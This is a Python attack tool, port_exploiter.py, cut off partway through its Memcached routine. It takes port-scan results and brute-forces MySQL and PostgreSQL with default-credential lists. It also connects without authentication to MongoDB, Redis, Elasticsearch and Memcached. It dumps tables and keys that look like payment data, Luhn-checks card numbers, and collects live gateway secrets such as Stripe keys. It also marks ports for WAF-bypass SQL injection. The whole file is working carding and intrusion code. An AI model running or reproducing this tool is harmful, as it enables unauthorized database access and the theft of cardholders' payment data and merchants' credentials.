"""
port_exploiter.py â€” Auto-exploit open ports found by port_scanner.

Connects to exposed databases (MySQL, PostgreSQL, MongoDB, Redis, Elasticsearch,
Memcached) with default / no credentials, dumps card/payment data, gateway keys,
and cached secrets.  Also detects alt-HTTP ports for WAF-bypass SQLi retries.
"""

from __future__ import annotations

import asyncio
import csv
import io
import json
import logging
import re
import socket
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional, Set, Tuple

logger = logging.getLogger(__name__)

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#   DEFAULT CREDENTIALS
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

MYSQL_CREDS: List[Tuple[str, str]] = [
    ("root", ""),
    ("root", "root"),
    ("root", "toor"),
    ("root", "mysql"),
    ("root", "password"),
    ("root", "123456"),
    ("root", "admin"),
    ("root", "Pass@123"),
    ("root", "P@ssw0rd"),
    ("admin", "admin"),
    ("admin", "password"),
    ("mysql", "mysql"),
    ("test", "test"),
    ("dbadmin", "dbadmin"),
    ("user", "user"),
]

POSTGRES_CREDS: List[Tuple[str, str]] = [
    ("postgres", "postgres"),
    ("postgres", ""),
    ("postgres", "password"),
    ("postgres", "admin"),
    ("postgres", "123456"),
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "root"),
    ("user", "user"),
]

MONGO_COMMON_DBS = [
    "admin", "local", "config",  # system
    "production", "main", "app", "api", "backend",
    "shop", "store", "ecommerce", "commerce",
    "payments", "billing", "orders", "customers",
    "web", "www", "site", "portal",
]

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#   CARD / PAYMENT TABLE AND COLUMN KEYWORDS
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

CARD_TABLE_KW: Set[str] = {
    "card", "credit", "debit", "payment", "billing", "transaction",
    "order", "checkout", "stripe", "paypal", "braintree", "gateway",
    "merchant", "subscription", "invoice", "charge", "refund",
    "vault", "token", "woocommerce", "wc_order", "sales_order",
    "sales_flat", "customer_card", "stored_card", "saved_card",
    "payment_method", "payment_profile", "cart", "purchase",
}

CARD_COL_KW: Set[str] = {
    "card", "cc_", "credit", "pan", "cvv", "cvc", "ccv", "exp",
    "card_number", "cardnum", "account_number", "routing", "iban",
    "stripe", "paypal", "braintree", "secret_key", "api_key",
    "publishable", "client_secret", "access_token", "sk_live",
    "pk_live", "merchant", "gateway", "billing", "amount", "total",
    "payment_status", "txn_id", "cardholder", "name_on_card",
    "security_code", "expiry", "expiration", "valid_thru",
}

# Luhn validator
def _luhn(n: str) -> bool:
    try:
        digits = [int(d) for d in n]
        odd = digits[-1::-2]
        even = digits[-2::-2]
        total = sum(odd) + sum(d * 2 - 9 if d * 2 > 9 else d * 2 for d in even)
        return total % 10 == 0
    except Exception:
        return False


def _looks_like_card(val: str) -> bool:
    clean = re.sub(r"[\s\-]", "", str(val))
    return bool(re.match(r"^[3-6]\d{12,18}$", clean) and _luhn(clean))


def _is_card_table(name: str) -> bool:
    nl = name.lower()
    return any(kw in nl for kw in CARD_TABLE_KW)


def _is_card_column(name: str) -> bool:
    nl = name.lower()
    return any(kw in nl for kw in CARD_COL_KW)


# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#   RESULT DATACLASS
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

@dataclass
class ExploitResult:
    domain: str = ""
    ip: str = ""
    service: str = ""
    port: int = 0
    auth_method: str = ""         # "default_creds", "no_auth", etc.
    creds_used: str = ""          # "root:" or "no_auth"
    databases_found: List[str] = field(default_factory=list)
    tables_found: List[str] = field(default_factory=list)
    card_tables: List[str] = field(default_factory=list)
    rows_dumped: int = 0
    cards_found: List[Dict] = field(default_factory=list)
    gateway_keys: List[Dict] = field(default_factory=list)
    raw_data: List[Dict] = field(default_factory=list)  # all rows from card tables
    redis_keys: List[str] = field(default_factory=list)
    redis_data: Dict[str, str] = field(default_factory=dict)
    es_indices: List[str] = field(default_factory=list)
    es_hits: List[Dict] = field(default_factory=list)
    memcached_items: List[str] = field(default_factory=list)
    alt_http_ports: List[int] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    success: bool = False


@dataclass
class FullExploitReport:
    domain: str = ""
    results: List[ExploitResult] = field(default_factory=list)
    total_cards: int = 0
    total_keys: int = 0
    total_rows: int = 0
    alt_http_ports: List[int] = field(default_factory=list)


# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#   MAIN EXPLOITER CLASS
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

class PortExploiter:
    """
    Auto-exploits high-value open ports:
      â€¢ MySQL/PostgreSQL â€” default cred login â†’ dump card/payment tables
      â€¢ MongoDB â€” no-auth connect â†’ find card collections
      â€¢ Redis â€” no-auth â†’ dump keys, sessions, cached card data
      â€¢ Elasticsearch â€” unauthenticated HTTP â†’ search card indices
      â€¢ Memcached â€” stats items â†’ cachedump
      â€¢ Alt-HTTP â€” flag ports 8080/8000 etc. for WAF-bypass SQLi
    """

    _MAX_EXPLOIT_SECS = 120  # global timeout per domain

    def __init__(
        self,
        reporter: Any = None,
        db: Any = None,
        config: Any = None,
    ):
        self.reporter = reporter
        self.db = db
        self.config = config
        self.stats = {
            "total_exploits": 0,
            "mysql_looted": 0,
            "postgres_looted": 0,
            "mongo_looted": 0,
            "redis_looted": 0,
            "es_looted": 0,
            "memcached_looted": 0,
            "total_cards": 0,
            "total_keys": 0,
            "total_rows": 0,
        }

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    #   PUBLIC API
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async def auto_exploit(
        self,
        domain: str,
        ip: str,
        port_result: Any,  # PortScanResult from port_scanner
    ) -> FullExploitReport:
        """
        Given port scan results, auto-exploit every high-value open port.
        Returns FullExploitReport with all findings.
        """
        report = FullExploitReport(domain=domain)
        if not port_result or not hasattr(port_result, "open_ports"):
            return report

        open_ports = port_result.open_ports
        if not open_ports:
            return report

        self.stats["total_exploits"] += 1
        deadline = time.time() + self._MAX_EXPLOIT_SECS

        for op in open_ports:
            if time.time() > deadline:
                logger.info(f"[PortExploit] Time budget reached for {domain}")
                break
            if op.state != "open":
                continue

            result = None
            try:
                if op.port == 3306:
                    result = await self._loot_mysql(ip, op.port, domain, deadline)
                elif op.port == 5432:
                    result = await self._loot_postgres(ip, op.port, domain, deadline)
                elif op.port == 27017:
                    result = await self._loot_mongodb(ip, op.port, domain, deadline)
                elif op.port == 6379:
                    result = await self._loot_redis(ip, op.port, domain, deadline)
                elif op.port == 9200:
                    result = await self._loot_elasticsearch(ip, op.port, domain, deadline)
                elif op.port == 11211:
                    result = await self._loot_memcached(ip, op.port, domain, deadline)
                elif op.port in (8080, 8000, 8008, 8081, 8180, 8888, 3000, 5000):
                    # Alt-HTTP â€” flag for WAF-bypass SQLi
                    report.alt_http_ports.append(op.port)

            except Exception as e:
                logger.debug(f"[PortExploit] {op.port} exploit error on {domain}: {e}")
                if result is None:
                    result = ExploitResult(
                        domain=domain, ip=ip, port=op.port,
                        service=op.service or "", errors=[str(e)]
                    )

            if result and result.success:
                report.results.append(result)
                report.total_cards += len(result.cards_found)
                report.total_keys += len(result.gateway_keys)
                report.total_rows += result.rows_dumped

        # Persist and report
        if report.results or report.alt_http_ports:
            await self._report_loot(report)
            await self._save_loot(report)

        # Update stats
        self.stats["total_cards"] += report.total_cards
        self.stats["total_keys"] += report.total_keys
        self.stats["total_rows"] += report.total_rows

        return report

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    #   MYSQL LOOTING
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async def _loot_mysql(
        self, ip: str, port: int, domain: str, deadline: float
    ) -> ExploitResult:
        result = ExploitResult(
            domain=domain, ip=ip, port=port, service="MySQL"
        )

        try:
            import aiomysql
        except ImportError:
            result.errors.append("aiomysql not installed")
            logger.debug("[PortExploit] aiomysql not installed â€” skip MySQL loot")
            return result

        conn = None
        for user, passwd in MYSQL_CREDS:
            if time.time() > deadline:
                break
            try:
                conn = await asyncio.wait_for(
                    aiomysql.connect(
                        host=ip, port=port, user=user, password=passwd,
                        connect_timeout=5,
                    ),
                    timeout=8,
                )
                result.auth_method = "default_creds"
                result.creds_used = f"{user}:{passwd}"
                logger.info(f"[PortExploit] MySQL {ip}:{port} â€” logged in as {user}:{passwd}")
                break
            except Exception:
                continue

        if not conn:
            result.errors.append("All default credentials failed")
            return result

        try:
            async with conn.cursor() as cur:
                # List databases
                await cur.execute("SHOW DATABASES")
                dbs = [row[0] for row in await cur.fetchall()]
                result.databases_found = dbs
                skip_dbs = {"information_schema", "performance_schema", "mysql", "sys"}
                target_dbs = [d for d in dbs if d.lower() not in skip_dbs]

                for db_name in target_dbs[:10]:
                    if time.time() > deadline:
                        break
                    try:
                        await cur.execute(f"USE `{db_name}`")
                        await cur.execute("SHOW TABLES")
                        tables = [row[0] for row in await cur.fetchall()]
                        result.tables_found.extend(
                            [f"{db_name}.{t}" for t in tables]
                        )

                        # Filter for card/payment tables
                        card_tables = [t for t in tables if _is_card_table(t)]
                        if not card_tables:
                            continue

                        result.card_tables.extend(
                            [f"{db_name}.{t}" for t in card_tables]
                        )

                        for table in card_tables[:8]:
                            if time.time() > deadline:
                                break
                            try:
                                await cur.execute(
                                    f"SELECT * FROM `{table}` LIMIT 500"
                                )
                                cols = [d[0] for d in cur.description]
                                rows = await cur.fetchall()
                                for row in rows:
                                    row_dict = dict(zip(cols, row))
                                    result.raw_data.append({
                                        "db": db_name,
                                        "table": table,
                                        **{k: str(v) for k, v in row_dict.items()},
                                    })
                                    result.rows_dumped += 1
                                    self._check_row_for_cards(row_dict, result)
                                    self._check_row_for_keys(row_dict, result)
                            except Exception as e:
                                logger.debug(
                                    f"[PortExploit] MySQL dump {db_name}.{table}: {e}"
                                )
                    except Exception as e:
                        logger.debug(f"[PortExploit] MySQL db {db_name}: {e}")

            result.success = bool(result.rows_dumped or result.card_tables)
            self.stats["mysql_looted"] += 1

        except Exception as e:
            result.errors.append(str(e))
        finally:
            conn.close()

        return result

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    #   POSTGRESQL LOOTING
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async def _loot_postgres(
        self, ip: str, port: int, domain: str, deadline: float
    ) -> ExploitResult:
        result = ExploitResult(
            domain=domain, ip=ip, port=port, service="PostgreSQL"
        )

        try:
            import asyncpg
        except ImportError:
            result.errors.append("asyncpg not installed")
            logger.debug("[PortExploit] asyncpg not installed â€” skip PostgreSQL loot")
            return result

        conn = None
        for user, passwd in POSTGRES_CREDS:
            if time.time() > deadline:
                break
            try:
                conn = await asyncio.wait_for(
                    asyncpg.connect(
                        host=ip, port=port, user=user, password=passwd,
                        timeout=5,
                    ),
                    timeout=8,
                )
                result.auth_method = "default_creds"
                result.creds_used = f"{user}:{passwd}"
                logger.info(
                    f"[PortExploit] PostgreSQL {ip}:{port} â€” logged in as {user}:{passwd}"
                )
                break
            except Exception:
                continue

        if not conn:
            result.errors.append("All default credentials failed")
            return result

        try:
            # List databases
            rows = await conn.fetch(
                "SELECT datname FROM pg_database WHERE datistemplate = false"
            )
            dbs = [r["datname"] for r in rows]
            result.databases_found = dbs

            # Get tables in current database
            tables_rows = await conn.fetch(
                "SELECT table_schema, table_name FROM information_schema.tables "
                "WHERE table_schema NOT IN ('pg_catalog', 'information_schema')"
            )
            all_tables = [
                (r["table_schema"], r["table_name"]) for r in tables_rows
            ]
            result.tables_found = [f"{s}.{t}" for s, t in all_tables]

            card_tables = [
                (s, t) for s, t in all_tables if _is_card_table(t)
            ]
            result.card_tables = [f"{s}.{t}" for s, t in card_tables]

            for schema, table in card_tables[:8]:
                if time.time() > deadline:
                    break
                try:
                    rows = await conn.fetch(
                        f'SELECT * FROM "{schema}"."{table}" LIMIT 500'
                    )
                    for row in rows:
                        row_dict = dict(row)
                        result.raw_data.append({
                            "schema": schema,
                            "table": table,
                            **{k: str(v) for k, v in row_dict.items()},
                        })
                        result.rows_dumped += 1
                        self._check_row_for_cards(row_dict, result)
                        self._check_row_for_keys(row_dict, result)
                except Exception as e:
                    logger.debug(
                        f"[PortExploit] PG dump {schema}.{table}: {e}"
                    )

            result.success = bool(result.rows_dumped or result.card_tables)
            self.stats["postgres_looted"] += 1

        except Exception as e:
            result.errors.append(str(e))
        finally:
            await conn.close()

        return result

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    #   MONGODB LOOTING (raw TCP wire protocol)
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async def _loot_mongodb(
        self, ip: str, port: int, domain: str, deadline: float
    ) -> ExploitResult:
        result = ExploitResult(
            domain=domain, ip=ip, port=port, service="MongoDB"
        )

        try:
            from motor.motor_asyncio import AsyncIOMotorClient
        except ImportError:
            # Fallback: try pymongo
            try:
                import pymongo
                return await self._loot_mongodb_sync(ip, port, domain, deadline)
            except ImportError:
                result.errors.append("motor/pymongo not installed")
                logger.debug("[PortExploit] motor not installed â€” skip MongoDB loot")
                return result

        client = None
        try:
            # MongoDB often has no auth by default
            client = AsyncIOMotorClient(
                f"mongodb://{ip}:{port}",
                serverSelectionTimeoutMS=5000,
                connectTimeoutMS=5000,
            )
            # Test connection â€” list databases
            db_names = await asyncio.wait_for(
                client.list_database_names(), timeout=8
            )
            result.auth_method = "no_auth"
            result.creds_used = "no_auth"
            result.databases_found = db_names
            logger.info(
                f"[PortExploit] MongoDB {ip}:{port} â€” no auth! DBs: {db_names}"
            )

            skip_dbs = {"admin", "local", "config"}
            target_dbs = [d for d in db_names if d not in skip_dbs]

            for db_name in target_dbs[:10]:
                if time.time() > deadline:
                    break
                try:
                    db = client[db_name]
                    collections = await asyncio.wait_for(
                        db.list_collection_names(), timeout=5
                    )
                    result.tables_found.extend(
                        [f"{db_name}.{c}" for c in collections]
                    )

                    card_cols = [c for c in collections if _is_card_table(c)]
                    if not card_cols:
                        continue

                    result.card_tables.extend(
                        [f"{db_name}.{c}" for c in card_cols]
                    )

                    for col_name in card_cols[:8]:
                        if time.time() > deadline:
                            break
                        try:
                            cursor = db[col_name].find().limit(500)
                            async for doc in cursor:
                                doc_str = {
                                    k: str(v) for k, v in doc.items()
                                    if k != "_id"
                                }
                                result.raw_data.append({
                                    "db": db_name,
                                    "collection": col_name,
                                    **doc_str,
                                })
                                result.rows_dumped += 1
                                self._check_row_for_cards(doc_str, result)
                                self._check_row_for_keys(doc_str, result)
                        except Exception as e:
                            logger.debug(
                                f"[PortExploit] Mongo dump {db_name}.{col_name}: {e}"
                            )
                except Exception as e:
                    logger.debug(f"[PortExploit] Mongo db {db_name}: {e}")

            result.success = bool(result.rows_dumped or result.card_tables or result.databases_found)
            self.stats["mongo_looted"] += 1

        except Exception as e:
            errmsg = str(e)
            if "auth" in errmsg.lower():
                result.errors.append("MongoDB requires authentication")
            else:
                result.errors.append(errmsg)
        finally:
            if client:
                client.close()

        return result

    async def _loot_mongodb_sync(
        self, ip: str, port: int, domain: str, deadline: float
    ) -> ExploitResult:
        """Fallback using synchronous pymongo in executor."""
        result = ExploitResult(
            domain=domain, ip=ip, port=port, service="MongoDB"
        )
        import pymongo

        try:
            client = pymongo.MongoClient(
                f"mongodb://{ip}:{port}",
                serverSelectionTimeoutMS=5000,
                connectTimeoutMS=5000,
            )
            db_names = client.list_database_names()
            result.auth_method = "no_auth"
            result.creds_used = "no_auth"
            result.databases_found = db_names
            logger.info(f"[PortExploit] MongoDB (sync) {ip}:{port} â€” no auth! DBs: {db_names}")

            skip_dbs = {"admin", "local", "config"}
            for db_name in [d for d in db_names if d not in skip_dbs][:10]:
                if time.time() > deadline:
                    break
                db = client[db_name]
                collections = db.list_collection_names()
                result.tables_found.extend([f"{db_name}.{c}" for c in collections])
                card_cols = [c for c in collections if _is_card_table(c)]
                if not card_cols:
                    continue
                result.card_tables.extend([f"{db_name}.{c}" for c in card_cols])
                for col_name in card_cols[:8]:
                    if time.time() > deadline:
                        break
                    try:
                        for doc in db[col_name].find().limit(500):
                            doc_str = {k: str(v) for k, v in doc.items() if k != "_id"}
                            result.raw_data.append({"db": db_name, "collection": col_name, **doc_str})
                            result.rows_dumped += 1
                            self._check_row_for_cards(doc_str, result)
                            self._check_row_for_keys(doc_str, result)
                    except Exception as e:
                        logger.debug(f"[PortExploit] Mongo sync dump {db_name}.{col_name}: {e}")

            result.success = bool(result.rows_dumped or result.card_tables or result.databases_found)
            self.stats["mongo_looted"] += 1
            client.close()
        except Exception as e:
            result.errors.append(str(e))

        return result

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    #   REDIS LOOTING (raw RESP protocol)
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async def _loot_redis(
        self, ip: str, port: int, domain: str, deadline: float
    ) -> ExploitResult:
        result = ExploitResult(
            domain=domain, ip=ip, port=port, service="Redis"
        )

        reader = writer = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=5
            )

            # Test: PING
            writer.write(b"PING\r\n")
            await writer.drain()
            resp = await asyncio.wait_for(reader.readline(), timeout=3)
            resp_str = resp.decode("utf-8", errors="replace").strip()

            if "NOAUTH" in resp_str or "ERR" in resp_str:
                result.errors.append("Redis requires authentication")
                return result

            if "+PONG" not in resp_str and "PONG" not in resp_str:
                result.errors.append(f"Unexpected PING response: {resp_str}")
                return result

            result.auth_method = "no_auth"
            result.creds_used = "no_auth"
            logger.info(f"[PortExploit] Redis {ip}:{port} â€” unauthenticated!")

            # INFO keyspace â€” how many keys per db
            writer.write(b"INFO keyspace\r\n")
            await writer.drain()
            info = await self._redis_read_bulk(reader)

            # DBSIZE
            writer.write(b"DBSIZE\r\n")
            await writer.drain()
            dbsize_resp = await asyncio.wait_for(reader.readline(), timeout=3)
            dbsize_str = dbsize_resp.decode("utf-8", errors="replace").strip()
            logger.info(f"[PortExploit] Redis DBSIZE: {dbsize_str}")

            # Get keys â€” use SCAN for safety (non-blocking)
            all_keys: List[str] = []
            cursor = "0"
            for _ in range(20):  # max 20 SCAN iterations
                if time.time() > deadline:
                    break
                writer.write(f"SCAN {cursor} COUNT 100\r\n".encode())
                await writer.drain()
                scan_resp = await self._redis_read_scan(reader)
                if scan_resp is None:
                    break
                cursor, keys = scan_resp
                all_keys.extend(keys)
                if cursor == "0" or len(all_keys) >= 2000:
                    break

            result.redis_keys = all_keys[:2000]
            logger.info(
                f"[PortExploit] Redis {ip}:{port} â€” found {len(all_keys)} keys"
            )

            # Look for card/payment/session keys
            interesting_kw = [
                "card", "payment", "credit", "stripe", "paypal", "order",
                "billing", "session", "token", "auth", "user", "admin",
                "gateway", "secret", "key", "api", "merchant", "cart",
            ]
            interesting_keys = [
                k for k in all_keys
                if any(kw in k.lower() for kw in interesting_kw)
            ]

            # GET values for interesting keys (string type)
            for key in interesting_keys[:200]:
                if time.time() > deadline:
                    break
                try:
                    writer.write(f"GET {key}\r\n".encode())
                    await writer.drain()
                    val = await self._redis_read_bulk(reader)
                    if val:
                        result.redis_data[key] = val[:5000]
                        result.rows_dumped += 1
                        # Check for card data in value
                        self._check_string_for_cards(val, key, result)
                        self._check_string_for_keys(val, key, result)
                except Exception:
                    continue

            result.success = bool(
                result.redis_keys or result.redis_data or result.rows_dumped
            )
            self.stats["redis_looted"] += 1

        except Exception as e:
            result.errors.append(str(e))
        finally:
            if writer:
                try:
                    writer.write(b"QUIT\r\n")
                    await writer.drain()
                    writer.close()
                except Exception:
                    pass

        return result

    async def _redis_read_bulk(self, reader: asyncio.StreamReader) -> str:
        """Read a Redis bulk string response."""
        try:
            line = await asyncio.wait_for(reader.readline(), timeout=3)
            line_str = line.decode("utf-8", errors="replace").strip()
            if line_str.startswith("$"):
                length = int(line_str[1:])
                if length < 0:
                    return ""
                data = await asyncio.wait_for(reader.read(length + 2), timeout=3)
                return data.decode("utf-8", errors="replace").strip()
            return line_str
        except Exception:
            return ""

    async def _redis_read_scan(
        self, reader: asyncio.StreamReader
    ) -> Optional[Tuple[str, List[str]]]:
        """Read SCAN response: *2 â†’ cursor, array of keys."""
        try:
            line = await asyncio.wait_for(reader.readline(), timeout=3)
            line_str = line.decode("utf-8", errors="replace").strip()
            if not line_str.startswith("*"):
                return None
            # cursor
            cursor_line = await asyncio.wait_for(reader.readline(), timeout=3)
            cursor_str = cursor_line.decode("utf-8", errors="replace").strip()
            if cursor_str.startswith("$"):
                length = int(cursor_str[1:])
                cursor_data = await asyncio.wait_for(reader.read(length + 2), timeout=3)
                cursor = cursor_data.decode("utf-8", errors="replace").strip()
            else:
                cursor = cursor_str
            # keys array
            keys_line = await asyncio.wait_for(reader.readline(), timeout=3)
            keys_str = keys_line.decode("utf-8", errors="replace").strip()
            keys: List[str] = []
            if keys_str.startswith("*"):
                count = int(keys_str[1:])
                for _ in range(count):
                    kl = await asyncio.wait_for(reader.readline(), timeout=3)
                    kls = kl.decode("utf-8", errors="replace").strip()
                    if kls.startswith("$"):
                        klen = int(kls[1:])
                        kdata = await asyncio.wait_for(reader.read(klen + 2), timeout=3)
                        keys.append(kdata.decode("utf-8", errors="replace").strip())
                    else:
                        keys.append(kls)
            return cursor, keys
        except Exception:
            return None

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    #   ELASTICSEARCH LOOTING (HTTP API via aiohttp)
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async def _loot_elasticsearch(
        self, ip: str, port: int, domain: str, deadline: float
    ) -> ExploitResult:
        result = ExploitResult(
            domain=domain, ip=ip, port=port, service="Elasticsearch"
        )

        import aiohttp

        base = f"http://{ip}:{port}"
        try:
            async with aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=10)
            ) as session:
                # Test connectivity â€” GET /
                async with session.get(f"{base}/") as resp:
                    if resp.status == 401:
                        result.errors.append("Elasticsearch requires auth")
                        return result
                    if resp.status != 200:
                        result.errors.append(f"ES returned {resp.status}")
                        return result
                    info = await resp.json()
                    result.auth_method = "no_auth"
                    result.creds_used = "no_auth"
                    version = info.get("version", {}).get("number", "?")
                    logger.info(
                        f"[PortExploit] Elasticsearch {ip}:{port} â€” "
                        f"v{version} unauthenticated!"
                    )

                # List indices
                async with session.get(f"{base}/_cat/indices?format=json") as resp:
                    if resp.status == 200:
                        indices = await resp.json()
                        result.es_indices = [
                            idx.get("index", "") for idx in indices
                            if not idx.get("index", "").startswith(".")
                        ]
                        result.tables_found = result.es_indices[:]

                # Search card/payment indices
                card_indices = [
                    idx for idx in result.es_indices if _is_card_table(idx)
                ]
                result.card_tables = card_indices

                # Also do a global search for card-like data
                search_queries = [
                    {"query": {"query_string": {"query": "card_number OR credit_card OR cvv OR payment"}}},
                    {"query": {"query_string": {"query": "stripe OR paypal OR braintree OR gateway"}}},
                    {"query": {"query_string": {"query": "sk_live OR pk_live OR secret_key OR api_key"}}},
                ]

                # Search specific card indices first
                for idx in card_indices[:5]:
                    if time.time() > deadline:
                        break
                    try:
                        async with session.post(
                            f"{base}/{idx}/_search?size=200",
                            json={"query": {"match_all": {}}},
                        ) as resp:
                            if resp.status == 200:
                                data = await resp.json()
                                hits = data.get("hits", {}).get("hits", [])
                                for hit in hits:
                                    src = hit.get("_source", {})
                                    result.es_hits.append({
                                        "index": idx,
                                        **{k: str(v) for k, v in src.items()},
                                    })
                                    result.rows_dumped += 1
                                    self._check_row_for_cards(src, result)
                                    self._check_row_for_keys(src, result)
                    except Exception as e:
                        logger.debug(f"[PortExploit] ES search {idx}: {e}")

                # Global queries across all indices
                for sq in search_queries:
                    if time.time() > deadline:
                        break
                    try:
                        async with session.post(
                            f"{base}/_search?size=100",
                            json=sq,
                        ) as resp:
                            if resp.status == 200:
                                data = await resp.json()
                                hits = data.get("hits", {}).get("hits", [])
                                for hit in hits:
                                    src = hit.get("_source", {})
                                    result.es_hits.append({
                                        "index": hit.get("_index", ""),
                                        **{k: str(v) for k, v in src.items()},
                                    })
                                    result.rows_dumped += 1
                                    self._check_row_for_cards(src, result)
                                    self._check_row_for_keys(src, result)
                    except Exception as e:
                        logger.debug(f"[PortExploit] ES global search: {e}")

                result.success = bool(
                    result.es_indices or result.es_hits or result.rows_dumped
                )
                self.stats["es_looted"] += 1

        except Exception as e:
            result.errors.append(str(e))

        return result

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    #   MEMCACHED LOOTING (raw text protocol)
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async def _loot_memcached(
        self, ip: str, port: int, domain: str, deadline: float
    ) -> ExploitResult:
        result = ExploitResult(
            domain=domain, ip=ip, port=port, service="Memcached"
        )

        reader = writer = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=5
            )

            # stats items â€” get slab info
            writer.write(b"stats items\r\n")
            await writer.drain()
            stats_data = await self._read_until_end(reader, b"END\r\n", timeout=5)
            stats_str = stats_data.decode("utf-8", errors="replace")

            result.auth_method = "no_auth"
            result.creds_used = "no_auth"
            logger.info(f"[PortExploit] Memcached {ip}:{port} â€” accessible!")

            # Parse slab IDs
            slab_ids = set()
            for line in stats_str.split("\n"):
                m = re.match(r"STAT items:(\d+):", line.strip())
                if m:
                    slab_ids.add(m.group(1))

            # stats cachedump for each slab
            for slab_id in sorted(slab_ids)[:20]:
                if time.time() > deadline:
                    break
                try:
                    writer.write(f"stats cachedump {slab_id} 100\r\n".encode())
                    await writer.drain()
                    dump_data = await self._read_until_end(
                        reader, b"END\r\n", timeout=5
                    )
                    dump_str = dump_data.decode("utf-8", errors="replace")

                    for line in dump_str.split("\n"):
                        m = re.match(r"ITEM (\S+) \[(\d+) b", line.strip())
                        if m:
                            key = m.group(1)
                            result.memcached_items.append(key)

                            # GET the actual value
                            if any(kw in key.lower() for kw in [
